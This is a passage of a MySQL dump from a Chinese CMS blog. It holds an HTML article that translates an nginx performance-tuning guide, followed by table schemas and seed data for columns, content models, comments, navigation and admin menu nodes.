&lt;/strong&gt;给客户端分配keep-alive链接超时时间。服务器将在这个超时时间过后关闭链接。我们将它设置低些可以让ngnix持续工作的时间更长。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;client_header_timeout&lt;/strong&gt; 和&lt;strong&gt;client_body_timeout&lt;/strong&gt; 设置请求头和请求体(各自)的超时时间。我们也可以把这个设置低些。&lt;/p&gt;&lt;p&gt;reset_timeout_connection告诉nginx关闭不响应的客户端连接。这将会释放那个客户端所占有的内存空间。&lt;/p&gt;&lt;p&gt;send_timeout 指定客户端的响应超时时间。这个设置不会用于整个转发器，而是在两次客户端读取操作之间。如果在这段时间内，客户端没有读取任何数据，nginx就会关闭连接。&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;limit_conn_zone $binary_remote_addr zone=addr:5m;\r\nlimit_conn addr 100;&lt;/pre&gt;&lt;p&gt;limit_conn_zone设置用于保存各种key（比如当前连接数）的共享内存的参数。5m就是5兆字节，这个值应该被设置的足够大以存储（32K*5）32byte状态或者（16K*5）64byte状态。&lt;/p&gt;&lt;p&gt;limit_conn为给定的key设置最大连接数。这里key是addr，我们设置的值是100，也就是说我们允许每一个IP地址最多同时打开有100个连接。&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;include /etc/nginx/mime.types;\r\ndefault_type text/html;\r\ncharset UTF-8;&lt;/pre&gt;&lt;p&gt;include只是一个在当前文件中包含另一个文件内容的指令。这里我们使用它来加载稍后会用到的一系列的MIME类型。&lt;/p&gt;&lt;p&gt;default_type设置文件使用的默认的MIME-type。&lt;/p&gt;&lt;p&gt;charset设置我们的头文件中的默认的字符集&lt;/p&gt;&lt;p&gt;以下两点对于性能的提升在伟大的WebMasters StackExchange中有解释。&lt;/p&gt;&lt;pre class=&quot;brush:ps;toolbar:false;&quot;&gt;gzip on;\r\ngzip_disable &quot;msie6&quot;;\r\n# gzip_static on;\r\ngzip_proxied any;\r\ngzip_min_length 1000;\r\ngzip_comp_level 4;\r\ngzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;&lt;/pre&gt;&lt;p&gt;gzip是告诉nginx采用gzip压缩的形式发送数据。这将会减少我们发送的数据量。&lt;/p&gt;&lt;p&gt;gzip_disable为指定的客户端禁用gzip功能。我们设置成IE6或者更低版本以使我们的方案能够广泛兼容。&lt;/p&gt;&lt;p&gt;gzip_static告诉nginx在压缩资源之前，先查找是否有预先gzip处理过的资源。这要求你预先压缩你的文件（在这个例子中被注释掉了），从而允许你使用最高压缩比，这样nginx就不用再压缩这些文件了（想要更详尽的gzip_static的信息，请点击这里）。&lt;/p&gt;&lt;p&gt;gzip_proxied允许或者禁止压缩基于请求和响应的响应流。我们设置为any，意味着将会压缩所有的请求。&lt;/p&gt;&lt;p&gt;gzip_min_length设置对数据启用压缩的最少字节数。如果一个请求小于1000字节，我们最好不要压缩它，因为压缩这些小的数据会降低处理此请求的所有进程的速度。&lt;/p&gt;&lt;p&gt;gzip_comp_level设置数据的压缩等级。这个等级可以是1-9之间的任意数值，9是最慢但是压缩比最大的。我们设置为4，这是一个比较折中的设置。&lt;/p&gt;&lt;p&gt;gzip_type设置需要压缩的数据格式。上面例子中已经有一些了，你也可以再添加更多的格式。&lt;/p&gt;&lt;pre class=&quot;brush:ps;toolbar:false;&quot;&gt;# cache informations about file descriptors, frequently accessed files\r\n# can boost performance, but you need to test those values\r\nopen_file_cache max=100000 inactive=20s;\r\nopen_file_cache_valid 30s;\r\nopen_file_cache_min_uses 2;\r\nopen_file_cache_errors on;\r\n##\r\n# Virtual Host Configs\r\n# aka our settings for specific servers\r\n##\r\ninclude /etc/nginx/conf.d/*.conf;\r\ninclude /etc/nginx/sites-enabled/*;&lt;/pre&gt;&lt;p&gt;open_file_cache打开缓存的同时也指定了缓存最大数目，以及缓存的时间。我们可以设置一个相对高的最大时间，这样我们可以在它们不活动超过20秒后清除掉。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;open_file_cache_valid&lt;/strong&gt; 在open_file_cache中指定检测正确信息的间隔时间。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;open_file_cache_min_uses&lt;/strong&gt; 定义了open_file_cache中指令参数不活动时间期间里最小的文件数。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;open_file_cache_errors&lt;/strong&gt;指定了当搜索一个文件时是否缓存错误信息，也包括再次给配置中添加文件。我们也包括了服务器模块，这些是在不同文件中定义的。如果你的服务器模块不在这些位置，你就得修改这一行来指定正确的位置。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;h2 id=&quot;content_h2_9_5&quot;&gt;一个完整的配置&lt;/h2&gt;&lt;pre class=&quot;brush:ps;toolbar:false;&quot;&gt;user www-data;\r\npid /var/run/nginx.pid;\r\nworker_processes auto;\r\nworker_rlimit_nofile 100000;\r\nevents {\r\nworker_connections 2048;\r\nmulti_accept on;\r\nuse epoll;\r\n}\r\nhttp {\r\nserver_tokens off;\r\nsendfile on;\r\ntcp_nopush on;\r\ntcp_nodelay on;\r\naccess_log off;\r\nerror_log /var/log/nginx/error.log crit;\r\nkeepalive_timeout 10;\r\nclient_header_timeout 10;\r\nclient_body_timeout 10;\r\nreset_timedout_connection on;\r\nsend_timeout 10;\r\nlimit_conn_zone $binary_remote_addr zone=addr:5m;\r\nlimit_conn addr 100;\r\ninclude /etc/nginx/mime.types;\r\ndefault_type text/html;\r\ncharset UTF-8;\r\ngzip on;\r\ngzip_disable &quot;msie6&quot;;\r\ngzip_proxied any;\r\ngzip_min_length 1000;\r\ngzip_comp_level 6;\r\ngzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;\r\nopen_file_cache max=100000 inactive=20s;\r\nopen_file_cache_valid 30s;\r\nopen_file_cache_min_uses 2;\r\nopen_file_cache_errors on;\r\ninclude /etc/nginx/conf.d/*.conf;\r\ninclude /etc/nginx/sites-enabled/*;\r\n}&lt;/pre&gt;&lt;p&gt;编辑完配置后，确认重启nginx使设置生效。&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sudo service nginx restart&lt;/pre&gt;&lt;h2 id=&quot;content_h2_9_10&quot;&gt;后记&lt;/h2&gt;&lt;p&gt;就这样！你的Web服务器现在已经就绪，之前困扰你的众多访问者的问题来吧。这并不是加速网站的唯一途径，很快我会写更多介绍其他加速网站方法的文章的。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;英文原文：&lt;a href=&quot;http://blog.zachorr.com/nginx-setup/&quot; target=&quot;_blank&quot;&gt;Battle ready Nginx &ndash; an optimization guide&lt;/a&gt;&lt;/p&gt;&lt;p&gt;译文：&lt;a href=&quot;http://www.oschina.net/translate/nginx-setup&quot;&gt;OSchina&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;转载链接：&lt;a target=&quot;_blank&quot; href=&quot;http://blog.sae.sina.com.cn/archives/2061&quot;&gt;http://blog.sae.sina.com.cn/archives/2061&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;', 1387249851);

-- --------------------------------------------------------

--
-- 表的结构 `la_attachment`
--

CREATE TABLE IF NOT EXISTS `la_attachment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `archiveid` int(10) NOT NULL DEFAULT '0' COMMENT '文档ID',
  `filepath` varchar(100) NOT NULL COMMENT '文件路径',
  `filename` varchar(100) NOT NULL COMMENT '原文件名',
  `savename` varchar(100) DEFAULT NULL COMMENT '文件保存名称',
  `filesize` int(10) NOT NULL DEFAULT '0' COMMENT '附件大小',
  `filetype` varchar(20) DEFAULT NULL COMMENT '文件类型(后缀名)',
  `downloadnum` int(10) NOT NULL DEFAULT '0' COMMENT '下载次数',
  `createtime` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_attachment`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_class`
--

CREATE TABLE IF NOT EXISTS `la_class` (
  `id` int(10) NOT NULL,
  `classname` varchar(15) NOT NULL,
  `createtime` int(20) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `class` (`classname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `la_class`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_column`
--

CREATE TABLE IF NOT EXISTS `la_column` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `columnname` varchar(50) NOT NULL,
  `parentid` int(11) DEFAULT '0',
  `topid` int(11) NOT NULL DEFAULT '0',
  `columntype` tinyint(1) DEFAULT '1' COMMENT '栏目类型123',
  `columnmodel` int(3) DEFAULT '1' COMMENT '栏目内容模型',
  `columnpath` varchar(100) DEFAULT NULL,
  `action` varchar(50) DEFAULT NULL,
  `sortrank` int(4) DEFAULT '0' COMMENT '排序位置',
  `title` varchar(100) DEFAULT NULL COMMENT '标题',
  `keyword` varchar(1000) DEFAULT NULL COMMENT '关键字',
  `description` varchar(3000) DEFAULT NULL COMMENT '描述',
  `content` text,
  `template_index` varchar(50) DEFAULT NULL,
  `template_list` varchar(50) DEFAULT NULL,
  `template_body` varchar(50) DEFAULT NULL,
  `isshow` tinyint(1) NOT NULL DEFAULT '1' COMMENT '0隐藏1显示',
  `createtime` int(10) NOT NULL DEFAULT '0',
  `updatetime` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=18 ;

--
-- 转存表中的数据 `la_column`
--

INSERT INTO `la_column` (`id`, `columnname`, `parentid`, `topid`, `columntype`, `columnmodel`, `columnpath`, `action`, `sortrank`, `title`, `keyword`, `description`, `content`, `template_index`, `template_list`, `template_body`, `isshow`, `createtime`, `updatetime`) VALUES
(1, 'Linux', 0, 1, 1, 1, NULL, 'lists', 1, '', '', '', '', 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1356402068, 1367060209),
(2, 'MAC OS', 0, 2, 2, 1, NULL, 'lists', 2, '', '', '', '', 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1356405490, 1368947565),
(3, 'Nginx', 0, 3, 2, 1, NULL, 'lists', 1, '', '', '', '', 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1356406231, 1363856604),
(4, 'PHP', 0, 4, 2, 1, NULL, 'lists', 2, '', '', '', '', 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1356414942, 1363856617),
(5, 'HTML+CSS', 0, 5, 2, 1, NULL, 'lists', 1, '', '', '', '', 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359689764, 1363856760),
(6, 'JavaScript', 0, 6, 2, 1, NULL, 'lists', 3, '', '', '', '', 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690256, 1359690256),
(7, 'Python', 0, 7, 2, 1, '', 'lists', 4, '', '', '', '', 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(8, 'Golang', 0, 8, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(9, 'Mobile', 0, 9, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(10, 'IDE', 0, 10, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(11, '算法', 0, 11, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(12, '数据库', 0, 12, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(13, '服务器', 0, 13, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(14, '系统架构', 0, 14, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(15, '缓存技术', 0, 15, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(16, 'Web安全', 0, 16, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270),
(17, '书籍推荐', 0, 17, 2, 1, NULL, 'lists', 0, NULL, NULL, NULL, NULL, 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1359690270, 1359690270);

-- --------------------------------------------------------

--
-- 表的结构 `la_column_model`
--

CREATE TABLE IF NOT EXISTS `la_column_model` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `description` varchar(200) DEFAULT NULL,
  `type` tinyint(1) DEFAULT '0',
  `issystem` tinyint(1) DEFAULT '0',
  `table` varchar(50) DEFAULT NULL,
  `usefields` varchar(300) DEFAULT '*' COMMENT '前台调用字段',
  `control` varchar(50) DEFAULT NULL,
  `column_index` varchar(100) DEFAULT NULL COMMENT '后台-栏目文档列表模板',
  `column_add` varchar(100) DEFAULT NULL COMMENT '后台-添加栏目模板',
  `column_edit` varchar(100) DEFAULT NULL COMMENT '后台-编辑栏目模板',
  `template_index` varchar(100) DEFAULT NULL COMMENT '前台-栏目封面页模板',
  `template_list` varchar(100) DEFAULT NULL COMMENT '前台-栏目文档列表模板',
  `template_body` varchar(100) DEFAULT NULL COMMENT '前台-栏目文档详细页模板',
  `status` tinyint(1) DEFAULT '1' COMMENT '0禁用1启用',
  `createtime` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=10 ;

--
-- 转存表中的数据 `la_column_model`
--

INSERT INTO `la_column_model` (`id`, `name`, `description`, `type`, `issystem`, `table`, `usefields`, `control`, `column_index`, `column_add`, `column_edit`, `template_index`, `template_list`, `template_body`, `status`, `createtime`) VALUES
(1, '文章模型', '文章模型', 0, 0, 'article', '', 'Article', 'Article/index.html', 'Article/add.html', 'Article/edit.html', 'Article/index.html', 'Article/list.html', 'Article/body.html', 1, 1363315175),
(2, '图片模型', '图集模型', 0, 0, 'image', '', 'Image', 'Image/index.html', 'Image/add.html', 'Image/edit.html', 'Image/index.html', 'Image/list.html', 'Image/body.html', 1, 1363315175),
(3, '下载模型', '下载模型', 0, 0, 'download', '', 'Download', 'Download/index.html', 'Download/add.html', 'Download/edit.html', 'Download/index.html', 'Download/list.html', 'Download/body.html', 1, 1363315175),
(4, '专题模型', '专题模型', 0, 0, 'topic', '', 'Topic', 'Topic/index.html', 'Topic/add.html', 'Topic/edit.html', 'Topic/index.html', 'Topic/list.html', 'Topic/body.html', 1, 1363315175),
(5, '软件模型', '软件模型', 0, 0, 'soft', '', 'Soft', 'Soft/index.html', 'Soft/add.html', 'Soft/edit.html', 'Soft/index.html', 'Soft/list.html', 'Soft/body.html', 1, 1363315203),
(6, '产品模型', '产品模型', 0, 0, 'product', '', 'Product', 'Product/index.html', 'Product/add.html', 'Product/edit.html', 'Product/index.html', 'Product/list.html', 'Product/body.html', 1, 1363315247),
(7, '分类信息模型', '分类信息模型', 0, 0, 'info', '', 'Info', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1363315306),
(8, '公共模型', '公共模型 关于我们、联系我们等', 0, 0, 'public', '', 'Public', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1364969716),
(9, '插件模型', '所有使用插件的栏目的模型控制器入口', 0, 0, 'plugin', '', 'Plugin', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1365668493);

-- --------------------------------------------------------

--
-- 表的结构 `la_comment`
--

CREATE TABLE IF NOT EXISTS `la_comment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL COMMENT '评论者',
  `email` varchar(100) DEFAULT NULL COMMENT '邮箱',
  `site` varchar(50) DEFAULT NULL COMMENT '站点',
  `content` varchar(200) NOT NULL COMMENT '内容',
  `avatar` varchar(100) DEFAULT NULL,
  `archiveid` int(10) DEFAULT NULL COMMENT '文档ID',
  `sourcecid` int(10) NOT NULL DEFAULT '0' COMMENT '回复的源评论ID',
  `createtime` int(20) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `la_comment`
--

INSERT INTO `la_comment` (`id`, `username`, `email`, `site`, `content`, `avatar`, `archiveid`, `sourcecid`, `createtime`) VALUES
(1, '步知道', 'luochuan.wang@gmail.com', 'www.imbzd.com', '测试评论！', '', 96, 0, 1387243622),
(2, '步知道', 'luochuan.wang@gmail.com', '', '回复步知道：回复评论测试！', '', 96, 1, 1387558669),
(3, '步知道', 'luochuan.wang@gmail.com', 'www.imbzd.com', '最近一直没时间写，等有时间补完。', '', 93, 0, 1387777910);

-- --------------------------------------------------------

--
-- 表的结构 `la_cooperate`
--

CREATE TABLE IF NOT EXISTS `la_cooperate` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '记录ID',
  `position` varchar(100) NOT NULL COMMENT '招聘职位',
  `quantity` int(10) NOT NULL DEFAULT '0' COMMENT '招聘人数',
  `education` varchar(50) DEFAULT NULL COMMENT '学历要求',
  `experience` varchar(100) DEFAULT NULL COMMENT '工作经验',
  `place` varchar(50) DEFAULT NULL COMMENT '工作地点',
  `nature` varchar(50) DEFAULT NULL COMMENT '工作性质',
  `salary` varchar(50) DEFAULT NULL COMMENT '工资待遇',
  `description` text COMMENT '职位描述',
  `columnid` int(10) DEFAULT '0' COMMENT '栏目ID',
  `author` varchar(50) DEFAULT NULL COMMENT '作者',
  `validitytime` varchar(50) DEFAULT NULL COMMENT '有效期',
  `publishtime` int(10) NOT NULL DEFAULT '0' COMMENT '发布时间',
  `updatetime` int(10) NOT NULL DEFAULT '0' COMMENT '更新时间',
  `state` tinyint(1) NOT NULL DEFAULT '1' COMMENT '文章状态 0:删除 1:正常',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_cooperate`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_flink`
--

CREATE TABLE IF NOT EXISTS `la_flink` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `linkname` varchar(50) NOT NULL COMMENT '链接名称',
  `linkurl` varchar(300) NOT NULL COMMENT '链接地址',
  `catalogid` int(10) NOT NULL DEFAULT '0' COMMENT '链接所属分类',
  `createtime` int(10) NOT NULL DEFAULT '0' COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_flink`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_flink_catalog`
--

CREATE TABLE IF NOT EXISTS `la_flink_catalog` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `catalogname` varchar(50) NOT NULL COMMENT '分类名称',
  `sort` int(10) NOT NULL DEFAULT '0' COMMENT '分类排序位置',
  `state` tinyint(1) NOT NULL DEFAULT '1' COMMENT '1正常0已删除',
  `createtime` int(10) NOT NULL DEFAULT '0' COMMENT '分类目录创建时间',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_flink_catalog`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_group`
--

CREATE TABLE IF NOT EXISTS `la_group` (
  `id` smallint(3) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL,
  `sort` smallint(3) DEFAULT '0',
  `isshow` tinyint(1) unsigned NOT NULL DEFAULT '1' COMMENT '是否显示0否1是',
  `createtime` int(11) unsigned DEFAULT '0',
  `updatetime` int(11) unsigned DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=7 ;

--
-- 转存表中的数据 `la_group`
--

INSERT INTO `la_group` (`id`, `title`, `sort`, `isshow`, `createtime`, `updatetime`) VALUES
(1, '系统管理', 1, 1, 1332390538, 1381051070),
(2, '会员中心', 2, 1, 1332390538, 1332390538),
(3, '核心内容', 3, 1, 1332390538, 1332390538),
(4, '网站更新', 4, 1, 1332390538, 1332390538),
(5, '系统插件', 5, 1, 1332390538, 1332390538),
(6, '系统设置', 0, 1, 1353316335, 1353316335);

-- --------------------------------------------------------

--
-- 表的结构 `la_images`
--

CREATE TABLE IF NOT EXISTS `la_images` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `imagepath` varchar(100) NOT NULL,
  `thumbpath` varchar(100) DEFAULT NULL,
  `imagetitle` varchar(100) DEFAULT NULL,
  `imagelink` varchar(100) DEFAULT NULL,
  `archiveid` int(10) NOT NULL DEFAULT '0' COMMENT '文档id',
  `imagename` varchar(100) DEFAULT NULL COMMENT '图片的原始名称',
  `savename` varchar(100) DEFAULT NULL COMMENT '图片的保存名称',
  `imagesize` int(10) DEFAULT '0' COMMENT '图片大小',
  `width` int(10) NOT NULL DEFAULT '0' COMMENT '图片宽度',
  `height` int(10) NOT NULL DEFAULT '0' COMMENT '图片高度',
  `createtime` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_images`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_message_board`
--

CREATE TABLE IF NOT EXISTS `la_message_board` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) DEFAULT NULL COMMENT '留言者名称',
  `email` varchar(100) DEFAULT NULL,
  `content` varchar(600) DEFAULT NULL,
  `createtime` int(10) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_message_board`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_navigation`
--

CREATE TABLE IF NOT EXISTS `la_navigation` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL,
  `link` varchar(100) NOT NULL,
  `sort` int(10) DEFAULT '0',
  `flag` tinyint(1) DEFAULT '0' COMMENT '导航位置 1:底部 2:快捷导航',
  `createtime` int(10) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=7 ;

--
-- 转存表中的数据 `la_navigation`
--

INSERT INTO `la_navigation` (`id`, `title`, `link`, `sort`, `flag`, `createtime`) VALUES
(1, '招贤纳士', 'http://localhost:82/laugh/index.php?s=Plugin/Cooperate&amp;columnid=9', 0, 1, 1368675893),
(2, '新闻资讯', 'http://localhost:82/laugh/index.php?s=Article/index&amp;columnid=2', 0, 2, 1368676692),
(3, '关于我们', 'http://localhost:82/laugh/index.php?s=Public/AboutUS&amp;columnid=10', 0, 1, 1368781020),
(4, '联系我们', 'http://localhost:82/laugh/index.php?s=Public/ContactUS&amp;columnid=11', 0, 1, 1368781037),
(5, '在线手册', 'javascript:;', 0, 1, 1368781072),
(6, '帮助中心', 'javascript:;', 0, 1, 1368781088);

-- --------------------------------------------------------

--
-- 表的结构 `la_node`
--

CREATE TABLE IF NOT EXISTS `la_node` (
  `id` smallint(6) NOT NULL AUTO_INCREMENT,
  `title` varchar(50) DEFAULT NULL,
  `remark` varchar(255) DEFAULT NULL,
  `control` varchar(50) NOT NULL,
  `action` varchar(50) NOT NULL,
  `pid` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '父节点ID',
  `groupid` tinyint(3) unsigned DEFAULT '0' COMMENT '分组id',
  `createtime` int(10) NOT NULL DEFAULT '0' COMMENT '创建日期',
  `updatetime` int(10) NOT NULL DEFAULT '0' COMMENT '更新日期',
  `isshow` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示0否1是',
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=55 ;

--
-- 转存表中的数据 `la_node`
--

INSERT INTO `la_node` (`id`, `title`, `remark`, `control`, `action`, `pid`, `groupid`, `createtime`, `updatetime`, `isshow`) VALUES
(1, '角色管理', '管理角色信息 可编辑角色权限/改变用户的角色', '', '', 0, 1, 0, 0, 1),
(2, '添加角色', '', 'Role', 'newRole', 1, 0, 0, 0, 1),
(3, '管理角色', '', 'Role', 'manageRole', 1, 0, 0, 0, 1),
(4, '日志管理', '', '', '', 0, 1, 0, 0, 1),
(5, '管理员登录日志', '', 'Log', 'AdminLoginLog', 4, 0, 0, 0, 1),
(6, '组管理', '', '', '', 0, 1, 0, 0, 1),
(7, '管理组', '', 'Group', 'manageGroup', 6, 0, 0, 0, 1),
(8, '节点管理', NULL, '', '', 0, 1, 0, 0, 1),
(9, '添加节点', '', 'Node', 'newNode', 8, 0, 1352711650, 1381051169, 1),
(10, '管理节点', '', 'Node', 'manageNode', 8, 0, 1352856214, 0, 1),
(11, '管理员用户管理', '管理员账号管理中心', '', '', 0, 1, 1352856238, 0, 1),
(12, '新管理员', '', 'Admin', 'newAdmin', 11, 0, 1352857554, 0, 1),
(13, '管理员列表', '', 'Admin', 'adminList', 11, 0, 1352858914, 0, 1),
(14, '会员管理', '', '', '', 0, 2, 1352944271, 0, 1),
(15, '会员列表', '', 'User', 'userList', 14, 0, 1353313113, 0, 1),
(16, '会员级别', '', 'User', 'userRank', 14, 0, 1353313186, 0, 1),
(17, '栏目管理', '管理网站栏目', '', '', 0, 3, 1353316137, 0, 1),
(18, '添加栏目', '', 'Column', 'newColumn', 17, 0, 1353316212, 0, 1),
(19, '网站栏目', '', 'Column', 'index', 17, 0, 1353316369, 0, 1),
(20, '内容管理', '', '', '', 0, 3, 1353316415, 0, 1),
(21, '文章管理', '', 'Article', 'index', 20, 0, 1353316474, 0, 1),
(22, '产品管理', '', 'Product', 'index', 20, 0, 1353316554, 0, 1),
(23, '图集管理', '', 'Image', 'index', 20, 0, 1353316597, 0, 1),
(24, '模型管理', '', '', '', 0, 3, 1353316622, 0, 1),
(25, '单页模型', '', 'CTModel', 'singlePage', 24, 0, 1353316736, 0, 1),
(26, '内容模型', '', 'CTModel', 'ColumnModel', 24, 0, 1355898117, 1355898117, 1),
(27, '自动更新', '', '', '', 0, 4, 1356507108, 1356507108, 1),
(28, '一键更新网站', '', 'Cache', 'updateAll', 27, 0, 1357722182, 1357722182, 1),
(29, '更新系统缓存', '', 'Cache', 'systemCache', 27, 0, 1358997259, 1358997259, 1),
(30, '常规插件', '', '', '', 0, 5, 1358999125, 1358999125, 1),
(31, '留言板', '', 'Plugin', 'messageList', 30, 0, 1358999272, 1358999272, 1),
(32, '人才招聘', '', 'Plugin', 'CooperateIndex', 30, 0, 1359010748, 1359010748, 1),
(33, '友情链接', '', 'Plugin', 'FlinkIndex', 30, 0, 1359010791, 1359010791, 1),
(34, '基本设置', '', '', '', 0, 6, 1359011153, 1359011153, 1),
(35, '系统基本参数', '', 'System', 'systemInfo', 34, 0, 1359011177, 1359011177, 1),
(36, '系统日志管理', '', 'System', 'sysLog', 34, 0, 1359011220, 1359011220, 1),
(37, '图片水印设置', '', 'System', 'imageMark', 34, 0, 1359011294, 1359011294, 1),
(38, '数据库管理', '', '', '', 0, 6, 1359011349, 1359011349, 1),
(39, '数据库备份', '', 'DataBase', 'BackUp', 38, 0, 1359011410, 1359011410, 1),
(40, '数据库', '', 'DataBase', '', 38, 0, 1359015999, 1359015999, 0),
(41, 'SQL命令行工具', '', 'DataBase', 'SQLClient', 38, 0, 1359016018, 1359016018, 1),
(42, '广告管理', '', '', '', 0, 5, 1364263938, 1364263938, 1),
(43, '首页中部banner', '', 'Advertise', 'HomeCenterAd', 42, 0, 1364263985, 1364263985, 1),
(44, '栏目顶部广告', '', 'Advertise', 'TopAd', 42, 0, 1364264199, 1364264199, 1),
(45, '图片管理', '', '', '', 0, 3, 1364265992, 1364265992, 1),
(46, '首页轮播图片', '', 'Image', 'HomeScrollImage', 45, 0, 1364266173, 1364266173, 1),
(47, '下载管理', '', 'Download', 'index', 20, 0, 1365562641, 1365562641, 1),
(48, '文件管理器', '', 'Plugin', 'fileManage', 30, 0, 1365562785, 1365562785, 1),
(49, '专题管理', '', 'Topic', 'index', 20, 0, 1365562964, 1365562964, 1),
(50, '软件管理', '', 'Soft', 'index', 20, 0, 1365563043, 1365563043, 1),
(51, '导航管理', '', 'Plugin', '', 0, 5, 1368669985, 1368669985, 1),
(52, '底部导航', '', 'Plugin', 'footNavigation', 51, 0, 1368670035, 1368670035, 1),
(53, '快捷导航', '', 'Plugin', 'sideNavigation', 51, 0, 1368670088, 1368670088, 1);

-- --------------------------------------------------------

--
-- 表的结构 `la_product`
--

CREATE TABLE IF NOT EXISTS `la_product` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '产品id',
  `archiveid` int(10) DEFAULT '0',
  `model` varchar(100) DEFAULT NULL,
  `brand` varchar(100) DEFAULT NULL,
  `color` varchar(100) DEFAULT NULL,
  `material` varchar(100) DEFAULT NULL,
  `size` varchar(100) DEFAULT NULL,
